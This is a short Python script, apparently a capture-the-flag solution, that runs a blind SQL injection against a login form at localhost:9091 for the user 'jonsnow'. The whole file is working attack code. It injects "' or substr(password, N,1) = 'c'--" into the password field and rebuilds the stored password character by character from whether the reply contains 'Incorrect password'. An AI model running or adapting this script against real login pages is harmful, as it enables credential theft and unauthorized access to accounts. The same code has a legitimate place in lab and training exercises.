#!/usr/bin/python3
import urllib.request as r
import string

half = lambda x,y: int((x+y)/2)
def post(pwd):
    req = r.Request(protocol + host, data=str.encode("username={}&password={}".format(username, pwd)))
    return r.urlopen(req).read()

vc = string.digits + string.ascii_uppercase + string.ascii_lowercase +'{}!_' 

protocol = 'http://'
host = 'localhost:9091'
username = 'jonsnow'
payload = lambda x,y: """' or substr(password, {},1) = '{}'--""".format(x,y)
password = ''

# I could binary search here but that's hard
cur_index = 1
while True:
    index = 0
    while True:
        pl = payload(cur_index, vc[index])
        resp = post(pl)
        if b'Incorrect password' in resp:
            break
        index += 1
    password += vc[index]
    cur_index += 1
    print(password)

